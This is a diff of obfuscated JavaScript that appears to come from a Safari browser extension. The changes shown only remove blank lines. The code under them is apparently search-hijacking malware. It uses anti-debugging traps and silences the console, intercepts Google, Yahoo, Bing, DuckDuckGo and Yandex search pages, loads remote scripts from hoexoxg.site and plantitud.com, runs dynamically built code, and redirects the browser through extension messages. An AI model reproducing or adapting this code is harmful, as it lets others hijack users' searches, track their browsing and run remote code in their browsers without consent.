                 var artistTrack = test.test(this.dNECWX.toString()) ? --this.TQjLvW[1] : --this.TQjLvW[0];
                 return this.QKPkcL(artistTrack);
             };
-
             WMCacheControl.prototype.QKPkcL = function (canCreateDiscussions) {
                 if (!Boolean(~canCreateDiscussions)) {
                     return canCreateDiscussions;
                 }
                 return this.xCJawF(this.mpnbTz);
             };
-
             WMCacheControl.prototype.xCJawF = function (saveNotifs) {
-
                 var fp = 0;
                 var len = this.TQjLvW.length;
                 for (; fp < len; fp++) {
@@ -2518,7 +1630,6 @@ var a0b = function (m, gamma) {
                 return saveNotifs(this.TQjLvW[0]);
             };
             (new WMCacheControl(a0b)).VyqkgG();
-
             a0b.avdWvu = true;
         }
         l = a0b.VqQkxC(l, gamma);
@@ -2529,55 +1640,41 @@ var a0b = function (m, gamma) {
     return l;
 };
 var f = function () {
-
     var c = true;
     return function (object__360, function__361) {
-
         var loopend = c ? function () {
             if (function__361) {
                 var cssobj = function__361.apply(object__360, arguments);
-
                 function__361 = null;
                 return cssobj;
             }
         } : function () {};
-
         c = true;
         return loopend;
     };
 }();
 var fO = f(this, function () {
-
     var intval = function () {
         return "dev";
     };
-
     var getDOMPath = function () {
         return "window";
     };
-
     var testcase = function () {
-
         var test = new RegExp("\\w+ *\\(\\) *{\\w+ *['|\"].+['|\"];? *}");
         return !test.test(intval.toString());
     };
-
     var _stringify = function () {
-
         var test = new RegExp("(\\\\[x|u](\\w){2,4})+");
         return test.test(getDOMPath.toString());
     };
-
     var wrap = function (p) {
-
         var ms_controller = ~-1 >> 1 + 255 % 0;
         if (p.indexOf("i" === ms_controller)) {
             create(p);
         }
     };
-
     var create = function (s) {
-
         var n = ~-4 >> 1 + 255 % 0;
         if (s.indexOf((!![] + "")[3]) !== n) {
             wrap(s);
@@ -2596,35 +1693,27 @@ var fO = f(this, function () {
 fO();
 var e = function () {
     var _ = {};
-
     _.fxIxA = function (letter, all) {
         return letter == all;
     };
-
     _.Scusm = function (type, imagePixelModule) {
         return type === imagePixelModule;
     };
-
     _.dKxLT = "nWFOv";
     var tileFuncs = _;
-
     var closeExpr = true;
     return function (object__360, function__361) {
         var scanKeyPubBytes = {};
-
         scanKeyPubBytes.uWefn = function (mmaModFeedbackAutomSyncedEvent, tiles) {
             return tileFuncs.fxIxA(mmaModFeedbackAutomSyncedEvent, tiles);
         };
-
         scanKeyPubBytes.iJJFY = function (mmaModFeedbackAutomSyncedEvent, tiles) {
             return tileFuncs.Scusm(mmaModFeedbackAutomSyncedEvent, tiles);
         };
         scanKeyPubBytes.ptPTo = tileFuncs.dKxLT;
         var Q = scanKeyPubBytes;
-
         var closingExpr = closeExpr ? function () {
             var undefined = {};
-
             undefined.oUaXQ = function (key, itm) {
                 return Q.uWefn(key, itm);
             };
@@ -2639,48 +1728,36 @@ var e = function () {
                     return void 0 !== j ? j : a[c];
                 } else {
                     var cssobj = function__361.apply(object__360, arguments);
-
                     function__361 = null;
                     return cssobj;
                 }
             }
         } : function () {};
-
         closeExpr = true;
         return closingExpr;
     };
 }();
 (function () {
     var target = {};
-
     target.JEoQx = "function *" + "( *)";
-
     target.pCGTJ = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     target.NxPSG = "init";
-
     target.FNcJD = function (buckets, name) {
         return buckets + name;
     };
-
     target.WAvwA = "chain";
-
     target.dtcxZ = "input";
-
     target.fZvbB = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     target.NETsm = function (callback, response_2, webhookMsg) {
         return callback(response_2, webhookMsg);
     };
     var a = target;
     a.NETsm(e, this, function () {
-
         var numericValueTests = new RegExp(a.JEoQx);
-
         var test = new RegExp("++ *(?:[" + "a-zA-Z_$][" + "0-9a-zA-Z_$]*)", "i");
         var label = a.pCGTJ(d, a.NxPSG);
         if (!numericValueTests.test(a.FNcJD(label, a.WAvwA)) || !test.test(label + a.dtcxZ)) {
@@ -2692,53 +1769,41 @@ var e = function () {
 })();
 var c = function () {
     var activeIndex = {};
-
     activeIndex.VLsdz = function (i, categoryStart) {
         return i === categoryStart;
     };
-
     activeIndex.WeHFV = function (_num2, _num1) {
         return _num2 / _num1;
     };
-
     activeIndex.lqvfw = function (optionsValue, value) {
         return optionsValue !== value;
     };
-
     activeIndex.dlhHl = "lrXze";
     var tileFuncs = activeIndex;
-
     var closeExpr = true;
     return function (object__360, function__361) {
         var values = {};
-
         values.OYBMz = function (mmaModFeedbackAutomSyncedEvent, tiles) {
             return tileFuncs.VLsdz(mmaModFeedbackAutomSyncedEvent, tiles);
         };
-
         values.oruSZ = function (mmaModFeedbackAutomSyncedEvent, tiles) {
             return tileFuncs.WeHFV(mmaModFeedbackAutomSyncedEvent, tiles);
         };
-
         values.PANfz = function (mmaModFeedbackAutomSyncedEvent, tiles) {
             return tileFuncs.lqvfw(mmaModFeedbackAutomSyncedEvent, tiles);
         };
-
         values.BzVPT = function (saveNotifs) {
             return saveNotifs();
         };
-
         values.xEkDU = "none";
         var handlers = values;
         if (tileFuncs.dlhHl !== tileFuncs.dlhHl) {
             return handlers.OYBMz(c, b) ? 0 !== c || handlers.OYBMz(handlers.oruSZ(1, c), 1 / b) : handlers.PANfz(c, c) && b !== b;
         } else {
-
             var closingExpr = closeExpr ? function () {
                 if ("cMLBQ" !== "lPRrQ") {
                     if (function__361) {
                         var cssobj = function__361.apply(object__360, arguments);
-
                         function__361 = null;
                         return cssobj;
                     }
@@ -2753,12 +1818,10 @@ var c = function () {
                     }
                     var query = {};
                     query.url = location.href;
-
                     query.status = d;
                     safari.extension.dispatchMessage(eventName, query);
                 }
             } : function () {};
-
             closeExpr = true;
             return closingExpr;
         }
@@ -2766,42 +1829,31 @@ var c = function () {
 }();
 var g = c(this, function () {
     var self = {};
-
     self.rlMnf = "info";
-
     self.fmCgP = "6|3|2|7|4|" + "0|9|5|8|1";
-
     self.EiPtW = function (letter, all) {
         return letter == all;
     };
-
     self.JcDyU = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     self.uIRnB = function (buckets, name) {
         return buckets + name;
     };
-
     self.posvb = function (saveNotifs) {
         return saveNotifs();
     };
-
     self.QHGdH = "lHXSM";
-
     self.ktKMm = function (optionsValue, value) {
         return optionsValue !== value;
     };
-
     self.qOBtJ = "FRXum";
     var app = self;
-
     var e = function () {};
     var result;
     try {
         result = app.posvb(aL);
     } catch (aV) {
-
         result = window;
     }
     if (!result.console) {
@@ -2818,45 +1870,36 @@ var g = c(this, function () {
         } else {
             result.console = function (e) {
                 var callbackVals = app.fmCgP.split("|");
-
                 var callbackCount = 0;
                 for (; true;) {
                     switch (callbackVals[callbackCount++]) {
                     case "0":
-
                         result.error = e;
                         continue;
                     case "1":
                         return result;
                     case "2":
-
                         result.warn = e;
                         continue;
                     case "3":
-
                         result.log = e;
                         continue;
                     case "4":
-
                         result.info = e;
                         continue;
                     case "5":
-
                         result.table = e;
                         continue;
                     case "6":
                         var result = {};
                         continue;
                     case "7":
-
                         result.debug = e;
                         continue;
                     case "8":
-
                         result.trace = e;
                         continue;
                     case "9":
-
                         result.exception = e;
                         continue;
                     }
@@ -2866,21 +1909,13 @@ var g = c(this, function () {
         }
     } else {
         if (app.ktKMm("jhqFx", app.qOBtJ)) {
-
             result.console.log = e;
-
             result.console.warn = e;
-
             result.console.debug = e;
-
             result.console.info = e;
-
             result.console.error = e;
-
             result.console.exception = e;
-
             result.console.table = e;
-
             result.console.trace = e;
         } else {
             if (app.EiPtW(200, xhr.status)) {
@@ -2904,27 +1939,18 @@ var g = c(this, function () {
 g();
 var $jscomp = $jscomp || {};
 $jscomp.scope = {};
-
 $jscomp.ASSUME_ES5 = false;
-
 $jscomp.ASSUME_NO_NATIVE_MAP = false;
-
 $jscomp.ASSUME_NO_NATIVE_SET = false;
-
 $jscomp.SIMPLE_FROUND_POLYFILL = false;
-
 $jscomp.ISOLATE_POLYFILLS = false;
-
 $jscomp.FORCE_POLYFILL_PROMISE = false;
-
 $jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION = false;
 $jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function (options, attr, device) {
     var currentRelations = {};
-
     currentRelations.PeGNY = function (letter, all) {
         return letter == all;
     };
-
     currentRelations.MhNYO = function (letter, all) {
         return letter == all;
     };
@@ -2935,33 +1961,24 @@ $jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defin
     options[attr] = device.value;
     return options;
 };
-
 $jscomp.getGlobal = function (data) {
     var objectsToHistory = {};
-
     objectsToHistory.xnQLp = "object";
-
     objectsToHistory.nlpZX = function (letter, all) {
         return letter == all;
     };
-
     objectsToHistory.pIfJQ = function (letter, all) {
         return letter == all;
     };
-
     objectsToHistory.KzRtm = function (rowTop, clientHeight) {
         return rowTop < clientHeight;
     };
-
     objectsToHistory.eKpjc = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     objectsToHistory.atXzl = "Cannot find global object";
     var handlers = objectsToHistory;
-
     data = [handlers.xnQLp == typeof globalThis && globalThis, data, handlers.nlpZX(handlers.xnQLp, typeof window) && window, handlers.pIfJQ(handlers.xnQLp, typeof self) && self, handlers.pIfJQ(handlers.xnQLp, typeof global) && global];
-
     var c = 0;
     for (; handlers.KzRtm(c, data.length); ++c) {
         var root = data[c];
@@ -2972,21 +1989,16 @@ $jscomp.getGlobal = function (data) {
     throw handlers.eKpjc(Error, handlers.atXzl);
 };
 $jscomp.global = $jscomp.getGlobal(this);
-
 $jscomp.IS_SYMBOL_NATIVE = "function" === typeof Symbol && "symbol" === typeof Symbol("x");
 $jscomp.TRUST_ES6_POLYFILLS = !$jscomp.ISOLATE_POLYFILLS || $jscomp.IS_SYMBOL_NATIVE;
 $jscomp.polyfills = {};
 $jscomp.propertyToPolyfillSymbol = {};
-
 $jscomp.POLYFILL_PREFIX = "$jscp$";
-
 var $jscomp$lookupPolyfilledValue = function (mapping, index) {
     var currentRelations = {};
-
     currentRelations.XQgAh = function (letter, all) {
         return letter == all;
     };
-
     currentRelations.mVvjs = function (optionsValue, value) {
         return optionsValue !== value;
     };
@@ -2998,7 +2010,6 @@ var $jscomp$lookupPolyfilledValue = function (mapping, index) {
     value = mapping[value];
     return addedRelations.mVvjs(void 0, value) ? value : mapping[index];
 };
-
 $jscomp.polyfill = function (mmCoreSplitViewBlock, mmaPushNotificationsComponent, mmaFrontpagePriority, isBgroundImg) {
     if (mmaPushNotificationsComponent) {
         if ($jscomp.ISOLATE_POLYFILLS) {
@@ -3008,28 +2019,22 @@ $jscomp.polyfill = function (mmCoreSplitViewBlock, mmaPushNotificationsComponent
         }
     }
 };
-
 $jscomp.polyfillUnisolated = function (p, key, prop, value) {
     var context = {};
-
     context.MZaNY = function (rowTop, clientHeight) {
         return rowTop < clientHeight;
     };
-
     context.LTohp = function (minWorkers, options) {
         return minWorkers in options;
     };
-
     context.wMiFc = function (b, a) {
         return b - a;
     };
-
     context.LnRSl = function (modstatus, mmCoreNotDownloadable) {
         return modstatus != mmCoreNotDownloadable;
     };
     var obj = context;
     var callbackVals = ("0|2|1|3|5|" + "4|6").split("|");
-
     var callbackCount = 0;
     for (; true;) {
         switch (callbackVals[callbackCount++]) {
@@ -3037,7 +2042,6 @@ $jscomp.polyfillUnisolated = function (p, key, prop, value) {
             prop = $jscomp.global;
             continue;
         case "1":
-
             value = 0;
             for (; obj.MZaNY(value, p.length - 1); value++) {
                 var name = p[value];
@@ -3072,44 +2076,31 @@ $jscomp.polyfillUnisolated = function (p, key, prop, value) {
         break;
     }
 };
-
 $jscomp.polyfillIsolated = function (layoutSets, c, e, v) {
     var array = {};
-
     array.JcgLM = "script";
-
     array.aSbxX = "src";
-
     array.wzMcV = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     array.GqrxY = function (minWorkers, options) {
         return minWorkers in options;
     };
-
     array.JctXN = function (angle, keyAngle) {
         return angle < keyAngle;
     };
-
     array.eKdnq = function (b, a) {
         return b - a;
     };
-
     array.TeFLu = "XoSug";
-
     array.Zqywp = "bGejl";
-
     array.JnhAC = "es6";
-
     array.fuRHh = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     array.cVkGM = function (modstatus, mmCoreNotDownloadable) {
         return modstatus != mmCoreNotDownloadable;
     };
-
     array.RWPzm = function (text, shorturl_result) {
         return text + shorturl_result;
     };
@@ -3118,7 +2109,6 @@ $jscomp.polyfillIsolated = function (layoutSets, c, e, v) {
     layoutSets = a.wzMcV(1, t.length);
     v = t[0];
     v = !layoutSets && a.GqrxY(v, $jscomp.polyfills) ? $jscomp.polyfills : $jscomp.global;
-
     var x = 0;
     for (; a.JctXN(x, a.eKdnq(t.length, 1)); x++) {
         if (a.TeFLu !== a.Zqywp) {
@@ -3158,15 +2148,12 @@ $jscomp.polyfillIsolated = function (layoutSets, c, e, v) {
 };
 $jscomp.polyfill("Object.is", function (animated) {
     var node = {};
-
     node.MCyFh = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     node.ALxWN = function (_num2, _num1) {
         return _num2 / _num1;
     };
-
     node.WLHGq = function (optionsValue, value) {
         return optionsValue !== value;
     };
@@ -3180,63 +2167,48 @@ setInterval(function () {
 }, 4E3);
 $jscomp.polyfill("Array.prototype.includes", function (obj) {
     var PL$6 = {};
-
     PL$6.sctZX = function (rowTop, clientHeight) {
         return rowTop < clientHeight;
     };
-
     PL$6.KNwkT = function (minWorkers, options) {
         return minWorkers in options;
     };
-
     PL$6.wiats = function (modstatus, mmCoreNotDownloadable) {
         return modstatus != mmCoreNotDownloadable;
     };
-
     PL$6.wKBGR = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     PL$6.qGKkk = "aDuqO";
-
     PL$6.RAGaL = "FRvxY";
-
     PL$6.Tputh = "3|4|5|0|2|" + "1";
-
     PL$6.fEwRH = function (_num1, _num2) {
         return _num1 > _num2;
     };
-
     PL$6.VqpCZ = function (buckets, name) {
         return buckets + name;
     };
-
     PL$6.vhVuS = function (rowTop, clientHeight) {
         return rowTop < clientHeight;
     };
     var PL$16 = PL$6;
     return obj ? obj : function (name, data) {
         var currentRelations = {};
-
         currentRelations.wOZRI = function (b, a) {
             return b - a;
         };
-
         currentRelations.gSgWJ = function (PL$15, texthtml) {
             return PL$16.sctZX(PL$15, texthtml);
         };
-
         currentRelations.xyOMo = function (PL$15, texthtml) {
             return PL$16.KNwkT(PL$15, texthtml);
         };
-
         currentRelations.BnqXR = function (PL$15, texthtml) {
             return PL$16.wiats(PL$15, texthtml);
         };
         var validators = currentRelations;
         if (PL$16.wKBGR(PL$16.qGKkk, PL$16.RAGaL)) {
             var callbackVals = ("2|1|5|3|4|" + "0|6").split("|");
-
             var callbackCount = 0;
             for (; true;) {
                 switch (callbackVals[callbackCount++]) {
@@ -3256,7 +2228,6 @@ $jscomp.polyfill("Array.prototype.includes", function (obj) {
                     value = data[obj];
                     continue;
                 case "5":
-
                     value = 0;
                     for (; validators.gSgWJ(value, validators.wOZRI(obj.length, 1)); value++) {
                         var val = obj[value];
@@ -3280,7 +2251,6 @@ $jscomp.polyfill("Array.prototype.includes", function (obj) {
             }
         } else {
             var callbackVals = PL$16.Tputh.split("|");
-
             var callbackCount = 0;
             for (; true;) {
                 switch (callbackVals[callbackCount++]) {
@@ -3305,7 +2275,6 @@ $jscomp.polyfill("Array.prototype.includes", function (obj) {
                     continue;
                 case "4":
                     if (value instanceof String) {
-
                         value = String(value);
                     }
                     continue;
@@ -3318,24 +2287,18 @@ $jscomp.polyfill("Array.prototype.includes", function (obj) {
         }
     };
 }, "es7", "es3");
-
 $jscomp.checkStringArgs = function (gameFolder, data, boardManager) {
     var currentRelations = {};
-
     currentRelations.HapgX = function (state, inUse) {
         return state == inUse;
     };
-
     currentRelations.zzeGg = function (buckets, name) {
         return buckets + name;
     };
-
     currentRelations.YpMqH = " must not be null or undefined";
-
     currentRelations.dvrxe = function (impromptuInstance, Impromptu) {
         return impromptuInstance instanceof Impromptu;
     };
-
     currentRelations.TnBEt = function (buckets, name) {
         return buckets + name;
     };
@@ -3347,19 +2310,14 @@ $jscomp.checkStringArgs = function (gameFolder, data, boardManager) {
 };
 $jscomp.polyfill("String.prototype.includes", function (canCreateDiscussions) {
     var currentRelations = {};
-
     currentRelations.hAVDR = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     currentRelations.VZLTI = "HNMAN";
-
     currentRelations.kKWZI = "IgBwG";
-
     currentRelations.zPpOU = function (optionsValue, value) {
         return optionsValue !== value;
     };
-
     currentRelations.wnCXG = function (isPrevType, isCurrentType) {
         return isPrevType || isCurrentType;
     };
@@ -3367,7 +2325,6 @@ $jscomp.polyfill("String.prototype.includes", function (canCreateDiscussions) {
     return canCreateDiscussions ? canCreateDiscussions : function (classNAME, data) {
         if (command_codes.hAVDR(command_codes.VZLTI, command_codes.kKWZI)) {
             var denies = fn.apply(context, arguments);
-
             fn = null;
             return denies;
         } else {
@@ -3376,162 +2333,112 @@ $jscomp.polyfill("String.prototype.includes", function (canCreateDiscussions) {
     };
 }, "es6", "es3");
 var xhr;
-
 var eventName = "beforeload";
-
 var isSafari13OrLater = null != (ver = navigator.appVersion.match(/version\/(\d+)/i)) && 13 <= ver[1];
 addEventListener(eventName, function (canCreateDiscussions) {
     var obj = {};
-
     obj.JoIJc = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     obj.JYSiN = "YisOc";
-
     obj.kDqqk = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     obj.kkKdz = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     obj.ZhRdW = function (_num2, _num1) {
         return _num2 / _num1;
     };
-
     obj.zGPfH = function (letter, all) {
         return letter == all;
     };
-
     obj.HiEgJ = "onCqt";
-
     obj.VpZKn = "info";
-
     obj.ntIza = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     obj.eZmva = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     obj.LTzVO = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     obj.Ekfap = "LDBCB";
-
     obj.ybZhr = function (saveNotifs) {
         return saveNotifs();
     };
-
     obj.pqZww = function (optionsValue, value) {
         return optionsValue !== value;
     };
-
     obj.YHrSW = "https://moj.plantitud.com/static/gs/s.js";
-
     obj.Fkmum = function (buckets, name) {
         return buckets + name;
     };
-
     obj.efkGB = ";return st" + 'atus("';
-
     obj.qhntV = function (f, widthCtrl) {
         return f(widthCtrl);
     };
-
     obj.BqKHm = function (f, widthCtrl) {
         return f(widthCtrl);
     };
-
     obj.pMnaR = "PghYb";
-
     obj.wLfeG = "none";
-
     obj.enFtF = "debu";
-
     obj.MnCHh = "gger";
-
     obj.xbetY = "stateObject";
-
     obj.GYIEc = function (optionsValue, value) {
         return optionsValue !== value;
     };
-
     obj.iuuTY = "mRWft";
-
     obj.ZqSjr = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     obj.ockTq = "0|1|2|4|3";
-
     obj.RAqgJ = function (callback, identifierPositions) {
         return callback(identifierPositions);
     };
-
     obj.OqCiT = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     obj.puXEi = function (mid_OR_high, high_OR_null) {
         return mid_OR_high <= high_OR_null;
     };
-
     obj.PNuAU = function (_num2, _num1) {
         return _num2 / _num1;
     };
-
     obj.IQPhl = "google.";
-
     obj.NhQJI = "yahoo.";
-
     obj.Cspsr = "bing.";
-
     obj.dSCrp = "duckduckgo.";
-
     obj.tLgUF = "yandex.";
-
     obj.RVBue = '[src="http' + "s://www.hoexoxg.site" + "/static/s/" + 'app.js"]';
-
     obj.GLgNM = "JAhJQ";
-
     obj.brJeG = "src";
-
     obj.bdNuj = "https://www.hoexoxg.site/static/s/app.js";
     var data = obj;
     if (!isSafari13OrLater && window.top === window) {
         if (!document.referrer && location.host && location.search && location.href && (location.host.includes(data.IQPhl) && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes(data.NhQJI) && location.href.match(/^https?:\/\/[^\/]+\/search.*?[?&]p=[^&].*$/) || location.host.includes(data.Cspsr) && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes(data.dSCrp) &&
                 location.href.match(/^https?:\/\/[^\/]+\/\?.*?\bq\b=[^&].*$/) || location.host.includes(data.tLgUF) && location.href.match(/^https?:\/\/[^\/]+\/search[\/]?\?.*?\btext\b=[^&].*$/))) {
-
             var get = function (size) {
                 var namespacedData = {};
-
                 namespacedData.NDkPJ = function (_relatedTarget, value2) {
                     return data.kkKdz(_relatedTarget, value2);
                 };
-
                 namespacedData.ImABp = function (optionsValue, value) {
                     return optionsValue !== value;
                 };
-
                 namespacedData.UxvDC = function (_relatedTarget, value2) {
                     return data.ZhRdW(_relatedTarget, value2);
                 };
-
                 namespacedData.oBxjj = function (_relatedTarget, value2) {
                     return data.zGPfH(_relatedTarget, value2);
                 };
                 namespacedData.DgwsO = data.HiEgJ;
                 namespacedData.DqVyF = data.VpZKn;
-
                 namespacedData.PbQri = function (_relatedTarget, value2) {
                     return data.ntIza(_relatedTarget, value2);
                 };
-
                 namespacedData.vvNlP = function (_relatedTarget, value2) {
                     return data.eZmva(_relatedTarget, value2);
                 };
@@ -3543,15 +2450,11 @@ addEventListener(eventName, function (canCreateDiscussions) {
                     if (xhr && data.pqZww(void 0, xhr)) {
                         xhr.abort();
                     }
-
                     xhr = new XMLHttpRequest;
-
                     xhr.timeout = 1E3;
-
                     xhr.ontimeout = function () {
                         if (data.JoIJc(data.JYSiN, "rqJsy")) {
                             var denies = fn.apply(context, arguments);
-
                             fn = null;
                             return denies;
                         } else {
@@ -3560,26 +2463,20 @@ addEventListener(eventName, function (canCreateDiscussions) {
                             }
                         }
                     };
-
                     xhr.onload = function () {
                         var currentRelations = {};
-
                         currentRelations.nZhyS = function (disabled, status) {
                             return _submitBtn.NDkPJ(disabled, status);
                         };
-
                         currentRelations.GHVVu = function (disabled, status) {
                             return _submitBtn.ImABp(disabled, status);
                         };
-
                         currentRelations.kionv = function (disabled, status) {
                             return _submitBtn.NDkPJ(disabled, status);
                         };
-
                         currentRelations.QFpCU = function (disabled, status) {
                             return _submitBtn.UxvDC(disabled, status);
                         };
-
                         currentRelations.tGtBF = function (disabled, status) {
                             return _submitBtn.ImABp(disabled, status);
                         };
@@ -3606,7 +2503,6 @@ addEventListener(eventName, function (canCreateDiscussions) {
                             }
                         }
                     };
-
                     xhr.onerror = function () {
                         update(false);
                     };
@@ -3616,12 +2512,10 @@ addEventListener(eventName, function (canCreateDiscussions) {
                     return true;
                 }
             };
-
             var scroll = function (position) {
                 position = (new Function(data.Fkmum(data.Fkmum(position + data.efkGB, location.href), '")'))).call();
                 data.qhntV(update, position);
             };
-
             var _positionActiveTinyMCE = function () {
                 if (data.pMnaR === data.pMnaR) {
                     canCreateDiscussions.preventDefault();
@@ -3636,7 +2530,6 @@ addEventListener(eventName, function (canCreateDiscussions) {
                     }
                 }
             };
-
             var update = function (data) {
                 if (data) {
                     data.ybZhr(_positionActiveTinyMCE);
@@ -3654,13 +2547,11 @@ addEventListener(eventName, function (canCreateDiscussions) {
                 }
                 var details = {};
                 details.url = location.href;
-
                 details.status = data;
                 safari.extension.dispatchMessage(eventName, details);
             };
             (function () {
                 var callbackVals = data.ockTq.split("|");
-
                 var callbackCount = 0;
                 for (; true;) {
                     switch (callbackVals[callbackCount++]) {
@@ -3699,10 +2590,8 @@ addEventListener(eventName, function (canCreateDiscussions) {
                     case "4":
                         if (value && void 0 !== value && data.ZqSjr(value.url, location.href)) {
                             value = value.timestamp;
-
                             value = !value || void 0 === value || data.puXEi(1, data.PNuAU(Date.now() - value, 1E3)) ? true : false;
                         } else {
-
                             value = true;
                         }
                         continue;
@@ -3729,36 +2618,27 @@ safari.self.addEventListener("message", function (body) {
         window.location.replace(body.message.url);
     }
 });
-
 function d(n) {
-
     function update(data) {
         var InitialSetupController = {};
-
         InitialSetupController.ZBnUA = function (saveNotifs) {
             return saveNotifs();
         };
-
         InitialSetupController.RZtwT = function (DIR, name) {
             return DIR + name;
         };
-
         InitialSetupController.SzVPc = function (buckets, name) {
             return buckets + name;
         };
-
         InitialSetupController.MSIuy = function (addedNodesArray, dr) {
             return options.XDcHC(addedNodesArray, dr);
         };
-
         InitialSetupController.hJySJ = "lQJpl";
-
         InitialSetupController.VIVVZ = "QMGfP";
         var controller = InitialSetupController;
         if (options.piOLC(options.yEBoB, options.rOjIw)) {
             if (fn) {
                 var newValue = fn.apply(context, arguments);
-
                 fn = null;
                 return newValue;
             }
@@ -3780,16 +2660,13 @@ function d(n) {
                     } else {
                         (function () {
                             if (controller.MSIuy(controller.hJySJ, controller.VIVVZ)) {
-
                                 var row = firstCall ? function () {
                                     if (fn) {
                                         var denies = fn.apply(context, arguments);
-
                                         fn = null;
                                         return denies;
                                     }
                                 } : function () {};
-
                                 firstCall = true;
                                 return row;
                             } else {
@@ -3803,69 +2680,47 @@ function d(n) {
         }
     }
     var headers = {};
-
     headers.XDcHC = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     headers.piOLC = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     headers.yEBoB = "oYzse";
-
     headers.rOjIw = "oPJQh";
-
     headers.dfvDm = "string";
-
     headers.dEDjy = "while (true) {}";
-
     headers.oBHDi = function (optionsValue, value) {
         return optionsValue !== value;
     };
-
     headers.lNQWJ = "XdVag";
-
     headers.oEuZl = function (buckets, name) {
         return buckets + name;
     };
-
     headers.rRNYx = function (_num2, _num1) {
         return _num2 / _num1;
     };
-
     headers.UGyZy = "length";
-
     headers.VJQoM = function (x_or_y, y) {
         return x_or_y === y;
     };
-
     headers.WUyQz = function (number_to_dividee, divided_by) {
         return number_to_dividee % divided_by;
     };
-
     headers.kixsA = function (dataSourceIndex, all) {
         return dataSourceIndex !== all;
     };
-
     headers.glETU = "rtMIy";
-
     headers.YTZsf = "NMvQw";
-
     headers.cgmTm = "debu";
-
     headers.qIEHj = function (buckets, name) {
         return buckets + name;
     };
-
     headers.UudQw = "gger";
-
     headers.cXzfQ = "stateObject";
-
     headers.bDFeq = function (saveNotifs, notifications) {
         return saveNotifs(notifications);
     };
-
     headers.UAcwT = "none";
     var options = headers;
     try {
